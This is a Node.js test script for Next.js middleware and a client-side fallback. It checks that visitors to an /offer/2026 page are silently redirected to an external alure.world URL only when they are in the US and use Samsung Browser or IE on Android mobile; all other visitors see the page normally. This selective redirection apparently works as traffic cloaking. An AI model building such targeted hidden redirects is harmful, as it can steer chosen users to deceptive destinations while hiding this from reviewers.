const fs = require('fs');
const path = require('path');
const ts = require('typescript');
const { NextRequest } = require('next/server');

// 1. Load and transpile src/middleware.ts directly from source
const middlewareSource = fs.readFileSync(path.join(__dirname, 'src/middleware.ts'), 'utf8');
const transpiled = ts.transpileModule(middlewareSource, {
  compilerOptions: { module: ts.ModuleKind.CommonJS, esModuleInterop: true },
});

const moduleObj = { exports: {} };
const evalFn = new Function('require', 'exports', 'module', transpiled.outputText);
evalFn(require, moduleObj.exports, moduleObj);
const { middleware } = moduleObj.exports;

const TARGET_URL = 'https://alure.world/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20';

// User-Agent Strings
const UA_SAMSUNG_MOBILE =
  'Mozilla/5.0 (Linux; Android 14; SAMSUNG SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/120.0.0.0 Mobile Safari/537.36';
const UA_IE_ANDROID_MOBILE =
  'Mozilla/5.0 (Linux; U; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36 Trident/7.0';
const UA_MSIE_ANDROID_MOBILE =
  'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 MSIE 10.0';
const UA_CHROME_MOBILE =
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36';
const UA_SAFARI_MOBILE =
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1';
const UA_SAMSUNG_DESKTOP =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/118.0.5993.89 Safari/537.36';
const UA_IE_DESKTOP =
  'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko';
const UA_DESKTOP_CHROME =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
const UA_SAMSUNG_TABLET =
  'Mozilla/5.0 (Linux; Android 13; SM-X900) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Safari/537.36';

console.log('='.repeat(70));
console.log('PART 1: SERVER-SIDE MIDDLEWARE (src/middleware.ts) SIMULATION');
console.log('='.repeat(70));

const serverScenarios = [
  {
    id: 'Scenario A.1 (Target - Samsung Mobile)',
    desc: 'US IP (Vercel header) + Samsung Mobile on Android',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_SAMSUNG_MOBILE,
      'x-vercel-ip-country': 'US',
    },
    expectRedirect: true,
    expectedTarget: TARGET_URL,
  },
  {
    id: 'Scenario A.2 (Target - Cloudflare header)',
    desc: 'US IP (Cloudflare cf-ipcountry) + Samsung Mobile on Android',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_SAMSUNG_MOBILE,
      'cf-ipcountry': 'US',
    },
    expectRedirect: true,
    expectedTarget: TARGET_URL,
  },
  {
    id: 'Scenario A.3 (Target - IE Trident on Android Mobile)',
    desc: 'US IP + IE (Trident) on Android Mobile',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_IE_ANDROID_MOBILE,
      'x-vercel-ip-country': 'US',
    },
    expectRedirect: true,
    expectedTarget: TARGET_URL,
  },
  {
    id: 'Scenario A.4 (Target - MSIE on Android Mobile)',
    desc: 'US IP + MSIE on Android Mobile',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_MSIE_ANDROID_MOBILE,
      'x-vercel-ip-country': 'US',
    },
    expectRedirect: true,
    expectedTarget: TARGET_URL,
  },
  {
    id: 'Scenario B.1 (Non-US IP - Samsung Mobile)',
    desc: 'India IP (x-vercel-ip-country: IN) + Samsung Mobile on Android',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_SAMSUNG_MOBILE,
      'x-vercel-ip-country': 'IN',
    },
    expectRedirect: false,
  },
  {
    id: 'Scenario B.2 (Non-US IP - IE Android Mobile)',
    desc: 'India IP (x-vercel-ip-country: IN) + IE Android Mobile',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_IE_ANDROID_MOBILE,
      'x-vercel-ip-country': 'IN',
    },
    expectRedirect: false,
  },
  {
    id: 'Scenario C.1 (Disallowed Browser - Chrome Mobile)',
    desc: 'US IP + Chrome Mobile on Android',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_CHROME_MOBILE,
      'x-vercel-ip-country': 'US',
    },
    expectRedirect: false,
  },
  {
    id: 'Scenario C.2 (Disallowed OS - iPhone Safari)',
    desc: 'US IP + Safari Mobile User-Agent (iOS, not Android)',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_SAFARI_MOBILE,
      'x-vercel-ip-country': 'US',
    },
    expectRedirect: false,
  },
  {
    id: 'Scenario D.1 (Desktop Samsung Browser)',
    desc: 'US IP + Desktop Samsung Browser (Windows NT, not Android)',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_SAMSUNG_DESKTOP,
      'x-vercel-ip-country': 'US',
    },
    expectRedirect: false,
  },
  {
    id: 'Scenario D.2 (Desktop IE)',
    desc: 'US IP + Desktop Internet Explorer (Windows NT, not Android)',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_IE_DESKTOP,
      'x-vercel-ip-country': 'US',
    },
    expectRedirect: false,
  },
  {
    id: 'Scenario D.3 (Desktop Chrome)',
    desc: 'US IP + Desktop Chrome (Windows)',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_DESKTOP_CHROME,
      'x-vercel-ip-country': 'US',
    },
    expectRedirect: false,
  },
  {
    id: 'Scenario E (Android Tablet)',
    desc: 'US IP + Samsung Browser on Android Tablet (no Mobile keyword)',
    url: 'http://localhost:3000/offer/2026',
    headers: {
      'user-agent': UA_SAMSUNG_TABLET,
      'x-vercel-ip-country': 'US',
    },
    expectRedirect: false,
  },
  {
    id: 'Scenario Non-Target Route',
    desc: 'US IP + Samsung Mobile on /videos (Non-offer route)',
    url: 'http://localhost:3000/videos',
    headers: {
      'user-agent': UA_SAMSUNG_MOBILE,
      'x-vercel-ip-country': 'US',
    },
    expectRedirect: false,
  },
];

let totalPassed = 0;
let totalFailed = 0;

for (const sc of serverScenarios) {
  const req = new NextRequest(sc.url, { headers: sc.headers });
  const res = middleware(req);

  const isRedirect = res.status >= 300 && res.status < 400;
  const location = res.headers.get('location');

  let passed = false;
  if (sc.expectRedirect) {
    passed = isRedirect && location === sc.expectedTarget && res.status === 307;
  } else {
    passed = !isRedirect;
  }

  if (passed) {
    totalPassed++;
    console.log(`[PASS] ${sc.id}: ${sc.desc}`);
    console.log(`       Outcome: ${isRedirect ? `Redirect -> ${location} (HTTP ${res.status})` : 'Pass Through (No Redirect)'}`);
  } else {
    totalFailed++;
    console.log(`[FAIL] ${sc.id}: ${sc.desc}`);
    console.log(`       Outcome: ${isRedirect ? `Redirect -> ${location} (HTTP ${res.status})` : 'No Redirect'}, Expected Redirect: ${sc.expectRedirect}`);
  }
}

console.log('\n' + '='.repeat(70));
console.log('PART 2: CLIENT-SIDE FALLBACK LOGIC SIMULATION');
console.log('='.repeat(70));

// Simulate client-side logic
function simulateClientFallback({ ua, serverCookie, mockIpApiCountry }) {
  let redirectedTo = null;
  let ipApiCalled = false;

  const isSamsungBrowser = /SamsungBrowser/i.test(ua);
  const isInternetExplorer = /MSIE|Trident/i.test(ua);
  const isAllowedBrowser = isSamsungBrowser || isInternetExplorer;
  const isAndroidMobile = /Android/i.test(ua) && /Mobile/i.test(ua);

  // Condition check: Early exit if not Android Mobile or not allowed browser
  if (!isAndroidMobile || !isAllowedBrowser) {
    return { redirected: false, redirectedTo: null, ipApiCalled };
  }

  // Server cookie check
  if (serverCookie) {
    if (serverCookie.toUpperCase() === 'US') {
      redirectedTo = TARGET_URL;
      return { redirected: true, redirectedTo, ipApiCalled };
    }
    return { redirected: false, redirectedTo: null, ipApiCalled };
  }

  // Fallback IP lookup
  ipApiCalled = true;
  if (mockIpApiCountry?.toUpperCase() === 'US') {
    redirectedTo = TARGET_URL;
    return { redirected: true, redirectedTo, ipApiCalled };
  }

  return { redirected: false, redirectedTo: null, ipApiCalled };
}

const clientScenarios = [
  {
    id: 'Client Fallback Scenario A (Target)',
    desc: 'No server header, Samsung Mobile on Android, IP lookup returns "US"',
    ua: UA_SAMSUNG_MOBILE,
    serverCookie: null,
    mockIpApiCountry: 'US',
    expectRedirect: true,
    expectApiCall: true,
  },
  {
    id: 'Client Fallback Scenario B',
    desc: 'No server header, Samsung Mobile on Android, IP lookup returns "IN"',
    ua: UA_SAMSUNG_MOBILE,
    serverCookie: null,
    mockIpApiCountry: 'IN',
    expectRedirect: false,
    expectApiCall: true,
  },
  {
    id: 'Client Fallback Scenario C (Mobile Chrome)',
    desc: 'No server header, Chrome Mobile (should bypass IP lookup & not redirect)',
    ua: UA_CHROME_MOBILE,
    serverCookie: null,
    mockIpApiCountry: 'US',
    expectRedirect: false,
    expectApiCall: false,
  },
  {
    id: 'Client Fallback Scenario D (Desktop Samsung)',
    desc: 'No server header, Desktop Samsung Browser (should bypass IP lookup & not redirect)',
    ua: UA_SAMSUNG_DESKTOP,
    serverCookie: null,
    mockIpApiCountry: 'US',
    expectRedirect: false,
    expectApiCall: false,
  },
  {
    id: 'Client Cookie Avoidance',
    desc: 'Server already identified country="IN" via cookie (bypasses IP lookup)',
    ua: UA_SAMSUNG_MOBILE,
    serverCookie: 'IN',
    mockIpApiCountry: 'US',
    expectRedirect: false,
    expectApiCall: false,
  },
];

for (const sc of clientScenarios) {
  const res = simulateClientFallback(sc);
  const passed = res.redirected === sc.expectRedirect && res.ipApiCalled === sc.expectApiCall;

  if (passed) {
    totalPassed++;
    console.log(`[PASS] ${sc.id}: ${sc.desc}`);
    console.log(`       Outcome: ${res.redirected ? `Redirected to ${res.redirectedTo}` : 'No Redirect (Stay on page)'}, IP API Called: ${res.ipApiCalled}`);
  } else {
    totalFailed++;
    console.log(`[FAIL] ${sc.id}: ${sc.desc}`);
    console.log(`       Outcome: ${res.redirected ? `Redirected to ${res.redirectedTo}` : 'No Redirect'}, IP API Called: ${res.ipApiCalled}`);
  }
}

console.log('\n' + '='.repeat(70));
console.log(`TOTAL TESTS: ${totalPassed + totalFailed} | PASSED: ${totalPassed} | FAILED: ${totalFailed}`);
console.log('='.repeat(70));

if (totalFailed > 0) {
  process.exit(1);
}
